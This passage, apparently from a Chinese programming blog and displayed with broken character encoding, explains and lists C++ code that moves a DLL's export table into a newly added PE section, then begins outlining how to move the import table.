å¯¼å‡ºè¡¨ç»“æ„ä½“ä¸­Nameå­—æ®µæŒ‡å‘çš„å­—ç¬¦ä¸²ï¼ˆå¯é€‰æ“ä½œï¼Œè¿™ä¸ªNameæ˜¯è¾…åŠ©ä¿¡æ¯ï¼‰ æ•´ä¸ªå¯¼å‡ºè¡¨ç»“æ„ä½“ ä»è¦æ‹·è´çš„å†…å®¹ä¸Šçœ‹ï¼Œæ¯”è¾ƒéº»çƒ¦çš„æ˜¯å‡½æ•°åå­—ç¬¦ä¸²çš„æ‹·è´ã€‚å› ä¸ºå‡½æ•°åé•¿åº¦ä¸å®šï¼Œæ²¡æ³•ç®€å•æŒ‰å¤§å°*æ•°é‡çš„æ–¹å¼æ•´å—æ‹·èµ°ï¼Œåªèƒ½éå†åç§°è¡¨çš„æ¯ä¸ªæ¡ç›®ï¼Œå•ç‹¬æ‹·è´æ¯ä¸ªå­—ç¬¦ä¸²ã€‚æ‹·å­—ç¬¦ä¸²æ—¶å¯ä»¥é¡ºå¸¦ä¿®æ­£åç§°è¡¨ä¸­çš„æ¡ç›®ã€‚æ“ä½œæ­¥éª¤å¦‚ä¸‹ï¼š å°†åç§°è¡¨ç§»åŠ¨åˆ°æ–°çš„ä½ç½®ã€‚ç„¶åï¼Œéå†ï¼ˆæ–°ä½ç½®ï¼‰åç§°è¡¨ä¸­çš„æ¯ä¸ªæ¡ç›® å¯¹äºæ¯ä¸€é¡¹ï¼Œæ ¹æ®å…¶RVAåœ°å€å®šä½åˆ°ç›¸åº”çš„å­—ç¬¦ä¸²ï¼Œå°†è¿™äº›å­—ç¬¦ä¸²æ‹·è´åˆ°æ–°ä½ç½® é¡ºå¸¦æ›´æ–°åç§°è¡¨ä¸­çš„RVAåœ°å€ï¼Œè®©å…¶æŒ‡å‘æ–°çš„å­—ç¬¦ä¸²çš„åœ°å€ã€‚ ç¨‹åºæµç¨‹è®¾è®¡ï¼š è·å¾—dllæ–‡ä»¶çš„m_lpFileBufferæ–‡ä»¶å†…å­˜æ˜ åƒï¼ˆæœªæ‹‰ä¼¸ï¼‰ï¼Œè·å–ç›¸å…³PEæŒ‡é’ˆ å¯¹m_lpFileBufferæ–°å¢å¤§å°ä¸º0x2000çš„èŠ‚ï¼Œè¿”å›å‡ºlpNewBufferï¼ˆæœªæ‹‰ä¼¸ï¼‰ åœ¨lpNewBufferä¸Šç§»åŠ¨å¯¼å‡ºè¡¨åˆ°æ–°èŠ‚ å…·ä½“åšæ³•æ˜¯ï¼š æŒ‡å‘åœ°å€è¡¨åï¼Œæ‹·èµ°æ•´ä¸ªåœ°å€è¡¨ï¼Œè®°å½•æ–°åœ°å€è¡¨çš„RVA æŒ‡å‘åºå·è¡¨åï¼Œæ‹·èµ°æ•´ä¸ªåºå·è¡¨ï¼Œè®°å½•æ–°åºå·è¡¨çš„RVA æŒ‡å‘åç§°è¡¨åï¼Œæ‹·èµ°æ•´ä¸ªåç§°è¡¨ï¼Œè®°å½•æ–°åç§°è¡¨çš„RVA æ ¹æ®æ–°åç§°è¡¨ä¸­çš„RVAé€ä¸ªæ‹·èµ°å…¶æŒ‡å‘çš„å­—ç¬¦ä¸²ï¼Œå¹¶æ›´æ–°åç§°è¡¨ä¸­å…¶æŒ‡å‘çš„å­—ç¬¦ä¸²åœ°å€ æŒ‡å‘å¯¼å‡ºè¡¨ä¸­Nameå­—ç¬¦ä¸²ï¼Œæ‹·èµ°ï¼Œè®°å½•Nameæ–°ä½ç½®çš„RVA æ‹·èµ°æ•´ä¸ªå¯¼å‡ºè¡¨ç»“æ„ï¼Œä¿®æ­£Nameã€AddressOfFunctionsã€AddressOfNameOrdinalsã€AddressOfNameså­—æ®µ æ›´æ–°æ•°æ®ç›®å½•é¡¹ä¸­å¯¼å‡ºè¡¨çš„RVAåœ°å€æŒ‡å‘ å°†lpNewBufferå­˜ç›˜ æ£€éªŒåŠæ³•ï¼šä½¿ç”¨DependenciesGuiæ‰“å¼€æ–°dllï¼Œçœ‹èƒ½å¦è§£æå‡ºå¯¼å‡ºå‡½æ•°çš„ä¿¡æ¯ æµ‹è¯•å‡½æ•° å¤§è‡´æµç¨‹12345678910111213141516171819202122232425262728293031323334353637//æµ‹è¯•ç§»åŠ¨å¯¼å‡ºè¡¨int TestRemoveExportTable()&#123; //å†™æ­»çš„ï¼Œæ–¹ä¾¿æµ‹è¯•ç”¨ //PEManipulator PEFile(&quot;E:\\\\temp\\\\Export Table\\\\MyTest_VC.dll&quot;); //VCçš„ PEManipulator PEFile(&quot;D:\\\\005_Codefield\\\\VS2019\\\\MyTestDll\\\\Debug\\\\MyTestDll.dll&quot;); //VSçš„ if (!PEFile.MapPEFile() || !PEFile.ValidateAndExtractPEPointers()) &#123; return 1; &#125; //æ–°å¢èŠ‚ LPVOID lpNewBuffer = PEFile.AddANewSection(0x2000); //æ–°èŠ‚ç›´æ¥0x2000ï¼Œä¹Ÿå¯ä»¥å…ˆç®—ä¸€éï¼ŒæŒ‰éœ€æ–°å¢èŠ‚çš„å¤§å° if (!lpNewBuffer) &#123; return 1; &#125; INVOKE_ON_EXIT([&amp;] &#123; delete[] lpNewBuffer; &#125;); printf(&quot;[+] AddANewSection for m_lpFileBuffer successfully. &quot;); //ç§»åŠ¨å¯¼å‡ºè¡¨åˆ°æ–°èŠ‚ if (!PEFile.MoveExportTableToNewSection(lpNewBuffer)) &#123; return 1; &#125; printf(&quot;[+] RemoveReloactionTableToTheNewSection successfully. &quot;); //å­˜ç›˜ if (!PEFile.SaveUnstretchedPEToDisk(lpNewBuffer, &quot;ExportTableRemoved&quot;)) &#123; return 1; &#125; printf(&quot;[+] SaveUnstretchedPEToDisk successfully. &quot;); return 0;&#125; å…·ä½“å®ç° 1BOOL MoveExportTableToNewSection(LPVOID lpNewBuffer); è·å–ç›¸å…³PEæŒ‡é’ˆï¼Œå’Œå¯¼å‡ºè¡¨æŒ‡é’ˆ 123456789101112131415//è·å–NewBufferä¸­ç›¸å…³çš„PEæŒ‡é’ˆauto pPeHdr_NewBuffer = GetPeHeader(lpNewBuffer);auto pOptionalPeHdr_NewBuffer = GetOptionPeHeaders(lpNewBuffer);auto pSecHdr_NewBuffer = GetSectionHeader(lpNewBuffer);if (!pPeHdr_NewBuffer || !pOptionalPeHdr_NewBuffer || !pSecHdr_NewBuffer)&#123; printf(&quot; [!] One or more PE Header pointers are invalid &quot;); return FALSE;&#125;// è·å–å¯¼å‡ºè¡¨æŒ‡é’ˆauto pExportDirectory = (PIMAGE_EXPORT_DIRECTORY)GetDataDirectoryPointer(IMAGE_DIRECTORY_ENTRY_EXPORT, lpNewBuffer);if (!pExportDirectory)&#123; return FALSE;&#125; æŒ‡å‘æ–°èŠ‚èµ·å§‹ä½ç½®ï¼Œå‡†å¤‡ç§»åŠ¨æ•°æ® 123// æ–°èŠ‚çš„èµ·å§‹ä½ç½®PIMAGE_SECTION_HEADER pNewSection = pSecHdr_NewBuffer + (pPeHdr_NewBuffer-&gt;NumberOfSections - 1); //æŒ‡é’ˆè¿ç®—æ“ä½œDWORD dwDstOffset = pNewSection-&gt;PointerToRawData; dwDstOffsetè¿™ä¸ªå€¼æ˜¯æ–°èŠ‚.PointerToRawDataï¼Œåœ¨åé¢æ‹·è´å®ŒæŸå—æ•°æ®åä¼šè¿›è¡Œæ›´æ–°ã€‚ dwDstOffsetè¿™ä¸ªå€¼æ˜¯FOAï¼ˆç›¸å¯¹äºæ–‡ä»¶å¤´çš„åç§»ï¼‰ï¼Œå› ä¸ºæˆ‘ä»¬éƒ½æ˜¯åœ¨æœªæ‹‰ä¼¸çš„Bufferä¸Šæ“ä½œã€‚è€Œå¯¼å‡ºè¡¨ä¸­å­˜çš„å­—æ®µéƒ½æ˜¯RVAåœ°å€ï¼Œæ‰€ä»¥åé¢è¦ç”¨åˆ°FOAToRVA ç§»åŠ¨æ•°æ® è¿›è¡Œåœ°å€è¡¨ã€åºå·è¡¨ã€åç§°è¡¨+å…¶æŒ‡å‘çš„å­—ç¬¦ä¸²ã€Nameå­—ç¬¦ä¸²ã€å¯¼å‡ºè¡¨ç»“æ„çš„ç§»åŠ¨ã€‚å®ƒä»¬çš„ä»£ç é€»è¾‘å¾ˆåƒï¼Œå¤§è‡´éƒ½æ˜¯ï¼š 123451ã€è·å¾—æŒ‡å‘å¾…æ‹·è´æ•°æ®çš„æŒ‡é’ˆï¼Œæ‹·xxå¤§å°åˆ°(PBYTE)(DWORD(lpNewBuffer)+dwDstOffset)å¤„2ã€è®°å½•å½“å‰åœ°å€dwDstOffsetï¼Œè½¬æˆRVA ï¼ˆå› ä¸ºè¿™æ˜¯ä¸ªFOAï¼‰3ã€æ›´æ–°dwDstOffsetçš„å€¼4ã€è¿›è¡Œä¸‹ä¸€ä¸ªå—æ•°æ®çš„æ‹·è´ï¼Œæ­¥éª¤åŒ1-3 åœ°å€è¡¨åºå·è¡¨åç§°è¡¨1234567891011121314151617// åœ°å€è¡¨DWORD dwFunctionTableFOA = 0;if (!RVAToFOA(pExportDirectory-&gt;AddressOfFunctions, dwFunctionTableFOA))&#123; return FALSE;&#125;auto pFunctionTable = PDWORD((DWORD)lpNewBuffer + dwFunctionTableFOA); //æŒ‡å‘åœ°å€è¡¨ memcpy((PBYTE)((DWORD)lpNewBuffer + dwDstOffset), pFunctionTable, (pExportDirectory-&gt;NumberOfFunctions) * sizeof(DWORD)); DWORD dwNewFunctionTableFOA = dwDstOffset; //è®°å½•åœ°å€è¡¨æ–°çš„èµ·å§‹ä½ç½®ï¼Œç”¨äºåé¢æ›´æ–°å¯¼å‡ºè¡¨ç»“æ„ä½“ä¸­çš„AddressOfFunctionså­—æ®µDWORD dwNewFunctionTableRVA = 0;if (!FOAToRVA(dwNewFunctionTableFOA, dwNewFunctionTableRVA, lpNewBuffer))&#123; return FALSE;&#125;dwDstOffset += (pExportDirectory-&gt;NumberOfFunctions) * sizeof(DWORD);1234567891011121314151617// åºå·è¡¨DWORD dwOrdinalTableFOA = 0;if (!RVAToFOA(pExportDirectory-&gt;AddressOfNameOrdinals, dwOrdinalTableFOA))&#123; return FALSE;&#125;auto pOrdinalTable = PWORD((DWORD)lpNewBuffer + dwOrdinalTableFOA); //æŒ‡å‘åºå·è¡¨ memcpy((PBYTE)((DWORD)lpNewBuffer + dwDstOffset), pOrdinalTable, (pExportDirectory-&gt;NumberOfNames) * sizeof(WORD)); DWORD dwNewOrdinalTableFOA = dwDstOffset; //è®°å½•åºå·è¡¨æ–°çš„èµ·å§‹ä½ç½®ï¼Œç”¨äºåé¢æ›´æ–°å¯¼å‡ºè¡¨ç»“æ„ä½“ä¸­çš„AddressOfNameOrdinalså­—æ®µDWORD dwNewOrdinalTableRVA = 0;if (!FOAToRVA(dwNewOrdinalTableFOA, dwNewOrdinalTableRVA, lpNewBuffer))&#123; return FALSE;&#125;dwDstOffset += (pExportDirectory-&gt;NumberOfNames) * sizeof(WORD);1234567891011121314151617// åç§°è¡¨DWORD dwNameTableFOA = 0;if (!RVAToFOA(pExportDirectory-&gt;AddressOfNames, dwNameTableFOA))&#123; return FALSE;&#125;auto pNameTable = PDWORD((DWORD)lpNewBuffer + dwNameTableFOA); //æŒ‡å‘åç§°è¡¨ memcpy((PBYTE)((DWORD)lpNewBuffer + dwDstOffset), pNameTable, (pExportDirectory-&gt;NumberOfNames) * sizeof(DWORD)); DWORD dwNewNameTableFOA = dwDstOffset; //è®°å½•åç§°è¡¨æ–°çš„èµ·å§‹ä½ç½®ï¼Œç”¨äºåé¢æ›´æ–°å¯¼å‡ºè¡¨ç»“æ„ä½“ä¸­çš„AddressOfNameså­—æ®µDWORD dwNewNameTableRVA = 0;if (!FOAToRVA(dwNewNameTableFOA, dwNewNameTableRVA, lpNewBuffer))&#123; return FALSE;&#125;dwDstOffset += (pExportDirectory-&gt;NumberOfNames) * sizeof(DWORD); å¤„ç†åç§°è¡¨æŒ‡å‘çš„å­—ç¬¦ä¸²12345678910111213141516171819202122232425// æ‹·åå­—ï¼Œè¾¹æ‹·åå­—è¾¹ä¿®å¤æ–°çš„åç§°è¡¨é‡Œçš„å€¼auto pNewNameTable = (PDWORD)((DWORD)lpNewBuffer + dwNewNameTableFOA);for (DWORD i = 0; i &lt; pExportDirectory-&gt;NumberOfNames; i++) &#123; DWORD dwNameRVA = pNameTable[i]; DWORD dwNameFOA = 0; if (!RVAToFOA(dwNameRVA, dwNameFOA)) &#123; return FALSE; &#125; PCHAR Name = (PCHAR)((DWORD)lpNewBuffer + dwNameFOA); //æŒ‡å‘åå­— DWORD dwNameLength = strlen(Name) + 1; memcpy((PBYTE)((DWORD)lpNewBuffer + dwDstOffset), Name, dwNameLength); //æ‹·è´å­—ç¬¦ä¸² DWORD dwNewNameFOA = dwDstOffset; //è®°å½•åå­—æ–°çš„èµ·å§‹ä½ç½®ï¼Œç”¨äºåé¢æ›´æ–°åç§°è¡¨ä¸­çš„RVAåœ°å€ DWORD dwNewNameRVA = 0; if (!FOAToRVA(dwNewNameFOA, dwNewNameRVA, lpNewBuffer)) &#123; return FALSE; &#125; pNewNameTable[i] = dwNewNameRVA; //æ›´æ–°åç§°è¡¨ä¸­çš„RVAåœ°å€ dwDstOffset += dwNameLength;&#125; å¯¼å‡ºè¡¨çš„Nameå­—æ®µå¤„ç†ï¼Œå’Œåœ°å€è¡¨ã€åºå·è¡¨ã€åç§°è¡¨å¤„ç†ä»£ç é€»è¾‘ä¸€æ · 1234567891011121314151617// å¯¼å‡ºè¡¨ä¸­çš„Nameå­—æ®µDWORD dwNameFOA = 0;if (!RVAToFOA(pExportDirectory-&gt;Name, dwNameFOA))&#123; return FALSE;&#125;auto cName = (PCHAR)((DWORD)lpNewBuffer + dwNameFOA); //æŒ‡å‘åå­— memcpy((PBYTE)((DWORD)lpNewBuffer + dwDstOffset), cName, strlen(cName) + 1); //æ‹·è´å­—ç¬¦ä¸² DWORD dwNewNameFOA = dwDstOffset; //è®°å½•åç§°è¡¨æ–°çš„èµ·å§‹ä½ç½®ï¼Œç”¨äºåé¢æ›´æ–°å¯¼å‡ºè¡¨ç»“æ„ä½“ä¸­çš„AddressOfNameså­—æ®µDWORD dwNewNameRVA = 0;if (!FOAToRVA(dwNewNameFOA, dwNewNameRVA, lpNewBuffer))&#123; return FALSE;&#125;dwDstOffset += strlen(cName) + 1; æ‹·è´å¯¼å‡ºè¡¨ç»“æ„ä½“åˆ°æ–°çš„ä½ç½®ï¼Œå’Œåœ°å€è¡¨ã€åºå·è¡¨ã€åç§°è¡¨å¤„ç†ä»£ç é€»è¾‘ä¸€æ · 12345678910//æ‹·è´å¯¼å‡ºè¡¨ç»“æ„ä½“åˆ°æ–°çš„ä½ç½®DWORD dwNewExportDirectoryFOA = dwDstOffset; //è®°å½•å¯¼å…¥è¡¨æ–°çš„èµ·å§‹ä½ç½®ï¼Œç”¨äºåé¢æ›´æ–°æ•°æ®ç›®å½•è¡¨ä¸­å¯¼å‡ºè¡¨æè¿°çš„VirtualAddresså­—æ®µDWORD dwNewExportDirectoryRVA = 0;if (!FOAToRVA(dwNewExportDirectoryFOA, dwNewExportDirectoryRVA, lpNewBuffer))&#123; return FALSE;&#125; memcpy((PBYTE)((DWORD)lpNewBuffer + dwDstOffset), pExportDirectory, sizeof(IMAGE_EXPORT_DIRECTORY));//dwDstAddr += sizeof(IMAGE_EXPORT_DIRECTORY); æ›´æ–°å¯¼å‡ºè¡¨ç»“æ„ä½“ä¸­çš„å­—æ®µ 123456//ä¿®æ­£å­—æ®µauto pNewExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((DWORD)lpNewBuffer + dwDstOffset);pNewExportDirectory-&gt;Name = dwNewNameRVA;pNewExportDirectory-&gt;AddressOfFunctions = dwNewFunctionTableRVA;pNewExportDirectory-&gt;AddressOfNameOrdinals = dwNewOrdinalTableRVA;pNewExportDirectory-&gt;AddressOfNames = dwNewNameTableRVA; æ›´æ–°æ•°æ®ç›®å½•è¡¨ä¸­é‡å®šä½è¡¨RVAåœ°å€çš„æŒ‡å‘ 12//æ›´æ–°æ•°æ®ç›®å½•è¡¨ä¸­çš„å¯¼å‡ºè¡¨VirtualAddresspOptionalPeHdr_NewBuffer-&gt;DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress = dwNewExportDirectoryRVA; å®Œæ•´ä»£ç 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153BOOL PEManipulator::MoveExportTableToNewSection(LPVOID lpNewBuffer)&#123; //è·å–NewBufferä¸­ç›¸å…³çš„PEæŒ‡é’ˆ auto pPeHdr_NewBuffer = GetPeHeader(lpNewBuffer); auto pOptionalPeHdr_NewBuffer = GetOptionPeHeaders(lpNewBuffer); auto pSecHdr_NewBuffer = GetSectionHeader(lpNewBuffer); if (!pPeHdr_NewBuffer || !pOptionalPeHdr_NewBuffer || !pSecHdr_NewBuffer) &#123; printf(&quot; [!] One or more PE Header pointers are invalid &quot;); return FALSE; &#125; // è·å–å¯¼å‡ºè¡¨æŒ‡é’ˆ auto pExportDirectory = (PIMAGE_EXPORT_DIRECTORY)GetDataDirectoryPointer(IMAGE_DIRECTORY_ENTRY_EXPORT, lpNewBuffer); if (!pExportDirectory) &#123; return FALSE; &#125; // æ–°èŠ‚çš„èµ·å§‹ä½ç½® PIMAGE_SECTION_HEADER pNewSection = pSecHdr_NewBuffer + (pPeHdr_NewBuffer-&gt;NumberOfSections - 1); //æŒ‡é’ˆè¿ç®—æ“ä½œ //DWORD dwNewExportTableFOA = pNewSection-&gt;PointerToRawData; //DWORD dwDstOffset = dwNewExportTableFOA; DWORD dwDstOffset = pNewSection-&gt;PointerToRawData; //å‡†å¤‡ç§»åŠ¨æ•°æ® // åœ°å€è¡¨ DWORD dwFunctionTableFOA = 0; if (!RVAToFOA(pExportDirectory-&gt;AddressOfFunctions, dwFunctionTableFOA)) &#123; return FALSE; &#125; auto pFunctionTable = PDWORD((DWORD)lpNewBuffer + dwFunctionTableFOA); //æŒ‡å‘åœ°å€è¡¨ memcpy((PBYTE)((DWORD)lpNewBuffer + dwDstOffset), pFunctionTable, (pExportDirectory-&gt;NumberOfFunctions) * sizeof(DWORD)); DWORD dwNewFunctionTableFOA = dwDstOffset; //è®°å½•åœ°å€è¡¨æ–°çš„èµ·å§‹ä½ç½®ï¼Œç”¨äºåé¢æ›´æ–°å¯¼å‡ºè¡¨ç»“æ„ä½“ä¸­çš„AddressOfFunctionså­—æ®µ DWORD dwNewFunctionTableRVA = 0; if (!FOAToRVA(dwNewFunctionTableFOA, dwNewFunctionTableRVA, lpNewBuffer)) &#123; return FALSE; &#125; dwDstOffset += (pExportDirectory-&gt;NumberOfFunctions) * sizeof(DWORD); // åºå·è¡¨ DWORD dwOrdinalTableFOA = 0; if (!RVAToFOA(pExportDirectory-&gt;AddressOfNameOrdinals, dwOrdinalTableFOA)) &#123; return FALSE; &#125; auto pOrdinalTable = PWORD((DWORD)lpNewBuffer + dwOrdinalTableFOA); //æŒ‡å‘åºå·è¡¨ memcpy((PBYTE)((DWORD)lpNewBuffer + dwDstOffset), pOrdinalTable, (pExportDirectory-&gt;NumberOfNames) * sizeof(WORD)); DWORD dwNewOrdinalTableFOA = dwDstOffset; //è®°å½•åºå·è¡¨æ–°çš„èµ·å§‹ä½ç½®ï¼Œç”¨äºåé¢æ›´æ–°å¯¼å‡ºè¡¨ç»“æ„ä½“ä¸­çš„AddressOfNameOrdinalså­—æ®µ DWORD dwNewOrdinalTableRVA = 0; if (!FOAToRVA(dwNewOrdinalTableFOA, dwNewOrdinalTableRVA, lpNewBuffer)) &#123; return FALSE; &#125; dwDstOffset += (pExportDirectory-&gt;NumberOfNames) * sizeof(WORD); // åç§°è¡¨ DWORD dwNameTableFOA = 0; if (!RVAToFOA(pExportDirectory-&gt;AddressOfNames, dwNameTableFOA)) &#123; return FALSE; &#125; auto pNameTable = PDWORD((DWORD)lpNewBuffer + dwNameTableFOA); //æŒ‡å‘åç§°è¡¨ memcpy((PBYTE)((DWORD)lpNewBuffer + dwDstOffset), pNameTable, (pExportDirectory-&gt;NumberOfNames) * sizeof(DWORD)); DWORD dwNewNameTableFOA = dwDstOffset; //è®°å½•åç§°è¡¨æ–°çš„èµ·å§‹ä½ç½®ï¼Œç”¨äºåé¢æ›´æ–°å¯¼å‡ºè¡¨ç»“æ„ä½“ä¸­çš„AddressOfNameså­—æ®µ DWORD dwNewNameTableRVA = 0; if (!FOAToRVA(dwNewNameTableFOA, dwNewNameTableRVA, lpNewBuffer)) &#123; return FALSE; &#125; dwDstOffset += (pExportDirectory-&gt;NumberOfNames) * sizeof(DWORD); // æ‹·åå­—ï¼Œè¾¹æ‹·åå­—è¾¹ä¿®å¤æ–°çš„åç§°è¡¨é‡Œçš„å€¼ auto pNewNameTable = (PDWORD)((DWORD)lpNewBuffer + dwNewNameTableFOA); for (DWORD i = 0; i &lt; pExportDirectory-&gt;NumberOfNames; i++) &#123; DWORD dwNameRVA = pNameTable[i]; DWORD dwNameFOA = 0; if (!RVAToFOA(dwNameRVA, dwNameFOA)) &#123; return FALSE; &#125; PCHAR Name = (PCHAR)((DWORD)lpNewBuffer + dwNameFOA); //æŒ‡å‘åå­— DWORD dwNameLength = strlen(Name) + 1; memcpy((PBYTE)((DWORD)lpNewBuffer + dwDstOffset), Name, dwNameLength); //æ‹·è´å­—ç¬¦ä¸² DWORD dwNewNameFOA = dwDstOffset; //è®°å½•åå­—æ–°çš„èµ·å§‹ä½ç½®ï¼Œç”¨äºåé¢æ›´æ–°åç§°è¡¨ä¸­çš„RVAåœ°å€ DWORD dwNewNameRVA = 0; if (!FOAToRVA(dwNewNameFOA, dwNewNameRVA, lpNewBuffer)) &#123; return FALSE; &#125; pNewNameTable[i] = dwNewNameRVA; //æ›´æ–°åç§°è¡¨ä¸­çš„RVAåœ°å€ dwDstOffset += dwNameLength; &#125; // å¯¼å‡ºè¡¨ä¸­çš„Nameå­—æ®µ DWORD dwNameFOA = 0; if (!RVAToFOA(pExportDirectory-&gt;Name, dwNameFOA)) &#123; return FALSE; &#125; auto cName = (PCHAR)((DWORD)lpNewBuffer + dwNameFOA); //æŒ‡å‘åå­— memcpy((PBYTE)((DWORD)lpNewBuffer + dwDstOffset), cName, strlen(cName) + 1); //æ‹·è´å­—ç¬¦ä¸² DWORD dwNewNameFOA = dwDstOffset; //è®°å½•åç§°è¡¨æ–°çš„èµ·å§‹ä½ç½®ï¼Œç”¨äºåé¢æ›´æ–°å¯¼å‡ºè¡¨ç»“æ„ä½“ä¸­çš„AddressOfNameså­—æ®µ DWORD dwNewNameRVA = 0; if (!FOAToRVA(dwNewNameFOA, dwNewNameRVA, lpNewBuffer)) &#123; return FALSE; &#125; dwDstOffset += strlen(cName) + 1; //æ‹·è´å¯¼å‡ºè¡¨ç»“æ„ä½“åˆ°æ–°çš„ä½ç½® DWORD dwNewExportDirectoryFOA = dwDstOffset; //è®°å½•å¯¼å…¥è¡¨æ–°çš„èµ·å§‹ä½ç½®ï¼Œç”¨äºåé¢æ›´æ–°æ•°æ®ç›®å½•è¡¨ä¸­å¯¼å‡ºè¡¨æè¿°çš„VirtualAddresså­—æ®µ DWORD dwNewExportDirectoryRVA = 0; if (!FOAToRVA(dwNewExportDirectoryFOA, dwNewExportDirectoryRVA, lpNewBuffer)) &#123; return FALSE; &#125; memcpy((PBYTE)((DWORD)lpNewBuffer + dwDstOffset), pExportDirectory, sizeof(IMAGE_EXPORT_DIRECTORY)); //dwDstAddr += sizeof(IMAGE_EXPORT_DIRECTORY); //ä¿®æ­£å­—æ®µ auto pNewExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((DWORD)lpNewBuffer + dwDstOffset); pNewExportDirectory-&gt;Name = dwNewNameRVA; pNewExportDirectory-&gt;AddressOfFunctions = dwNewFunctionTableRVA; pNewExportDirectory-&gt;AddressOfNameOrdinals = dwNewOrdinalTableRVA; pNewExportDirectory-&gt;AddressOfNames = dwNewNameTableRVA; //æ›´æ–°æ•°æ®ç›®å½•è¡¨ä¸­çš„å¯¼å‡ºè¡¨VirtualAddress pOptionalPeHdr_NewBuffer-&gt;DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress = dwNewExportDirectoryRVA; printf(&quot;[+] Export Table successfully moved to new section. &quot;); return TRUE;&#125; è¿è¡Œç»“æœ VCçš„dllVSçš„dll ä½¿ç”¨DependenciesGuiæ‰“å¼€æ–°dllï¼Œèƒ½è§£æå‡ºå¯¼å‡ºå‡½æ•°çš„ä¿¡æ¯ ä½¿ç”¨DependenciesGuiæ‰“å¼€æ–°dllï¼Œèƒ½è§£æå‡ºå¯¼å‡ºå‡½æ•°çš„ä¿¡æ¯ ç§»åŠ¨å¯¼å…¥è¡¨ è¦ç§»åŠ¨çš„å†…å®¹ï¼š æ‰€æœ‰å¯¼å…¥è¡¨ï¼ˆIIDç»“æ„ï¼‰ æ¯å¼ å¯¼å…¥è¡¨é‡Œçš„INTè¡¨ INTè¡¨æŒ‡å‘çš„æç¤ºåè¡¨ï¼ˆå¦‚æœINTè¡¨é¡¹æ˜¯å‡½æ•°åæ–¹å¼å¯¼å…¥çš„è¯ï¼‰ å¯¼å…¥è¡¨çš„Nameå­—æ®µ IATè¡¨ä¸èƒ½ç§»ï¼Œè¿™é‡Œçš„â€œä¸èƒ½ç§»â€æ˜¯æŒ‡ç§»åŠ¨çš„ä»£ä»·å¤ªå¤§ã€‚åœ¨ç¨‹åºä¸­æœ‰å¯¹IATè¡¨è¡¨é¡¹åœ°å€çš„å¼•ç”¨ï¼Œæ¯”å¦‚ 1call dword ptr [xxxx]\t;xxxxæ˜¯å¯¼å…¥è¡¨è¡¨é¡¹åœ°å€ï¼Œåœ¨PEåŠ è½½åè¢«æ›¿æ¢ä¸ºå¯¼å…¥å‡½æ•°çš„å‡½æ•°åœ°å€ å°†IATè¡¨ç§»èµ°çš„è¯ï¼Œéœ€è¦çŸ¥é“ç¨‹åºä¸­è¿™äº›å¼•ç”¨å¹¶ä¿®æ­£å®ƒä»¬ ç›®å‰ç¬”è€…ä¸æ¸…æ¥šæ€ä¹ˆå¾—çŸ¥è¿™äº›å¼•ç”¨ å¯¼å…¥è¡¨å’ŒINTè¡¨ä»¥å…¨0ç»“æ„ä½“ç»“å°¾ï¼Œå¯¼å…¥è¡¨å‡ å¼ ï¼Œæ¯ä¸ªå¯¼å…¥è¡¨ä¸‹çš„INTè¡¨æœ‰å‡ é¡¹ï¼Œéœ€è¦éå†ä¸€æ¬¡æ‰çŸ¥é“ã€‚ æ‹·æ•°æ®çš„é¡ºåºå¯ä»¥çœ‹éœ€æ±‚ 123456789101112131415æ‹·è´æ–¹å¼ä¸€ï¼š\tæ–°ä½ç½®ä¸Šæ•°æ®ä¾æ¬¡ä¸ºï¼š æ‰€æœ‰å¯¼å…¥è¡¨ç»“æ„ï¼Œæ‰€æœ‰INTè¡¨ï¼Œæ‰€æœ‰åç§°æç¤ºè¡¨\tä¼ªä»£ç ï¼š ç¬¬ä¸€ä¸ªwhile()ç»Ÿè®¡å¯¼å…¥è¡¨ä¸ªæ•°å¹¶ç§»åŠ¨ ç¬¬äºŒä¸ªwhileï¼Œé‡Œå±‚whileï¼Œå¤„ç†æ‰€æœ‰INTè¡¨ ç¬¬ä¸‰ä¸ªwhile()ï¼Œé‡Œå±‚whileéå†INTè¡¨ï¼Œå¤„ç†æ‰€æœ‰æç¤ºåè¡¨ï¼›å¤–å±‚whileå¤„ç†Nameå­—æ®µæ‹·è´æ–¹å¼äºŒï¼š\tæ–°ä½ç½®ä¸Šæ•°æ®ä¾æ¬¡ä¸ºï¼š æ‰€æœ‰å¯¼å…¥è¡¨ç»“æ„ï¼›ç¬¬ä¸€ä¸ªå¯¼å…¥è¡¨çš„INTè¡¨ï¼Œæç¤ºåè¡¨ï¼ŒNameå­—æ®µï¼›ç¬¬äºŒä¸ªå¯¼å…¥è¡¨çš„INTè¡¨ï¼Œæç¤ºåè¡¨ï¼ŒNameå­—æ®µï¼›...\tä¼ªä»£ç ï¼š ç¬¬ä¸€ä¸ªwhile()ç»Ÿè®¡å¯¼å…¥è¡¨ä¸ªæ•°å¹¶ç§»åŠ¨ ç¬¬äºŒä¸ªwhileï¼Œé‡Œå±‚whileå¤„ç†INTè¡¨ï¼Œå¤„ç†æç¤ºåè¡¨ï¼›å¤„ç†Nameå­—æ®µ å› ä¸ºæƒ³è®©ç›¸åŒçš„æ•°æ®æ”¾ä¸€å—ï¼Œåé¢ä»£ç æ˜¯æŒ‰æ–¹å¼ä¸€çš„é¡ºåºæ¥ç§»åŠ¨å¯¼å…¥è¡¨æ•°æ® ç¨‹åºæµç¨‹è®¾è®¡ï¼š è·å¾—exeæ–‡ä»¶çš„m_lpFileBufferæ–‡ä»¶å†…å­˜æ˜ åƒï¼ˆæœªæ‹‰ä¼¸ï¼‰ï¼Œè·å–ç›¸å…³PEæŒ‡é’ˆ å¯¹m_lpFileBufferæ–°å¢å¤§å°ä¸º0x2000çš„èŠ‚ï¼Œè¿”å›å‡ºlpNewBufferï¼ˆæœªæ‹‰ä¼¸ï¼‰ åœ¨lpNewBufferä¸Šç§»åŠ¨å¯¼å…¥è¡¨åˆ°æ–°èŠ‚ å…·ä½“åšæ³•æ˜¯ï¼š éå†å¯¼å…¥è¡¨ï¼Œç»Ÿè®¡ä¸ªæ•°ï¼Œå°†å¯¼å…¥è¡¨æ‹·èµ°ï¼Œè®°å½•æ–°å¯¼å…¥è¡¨çš„RVA 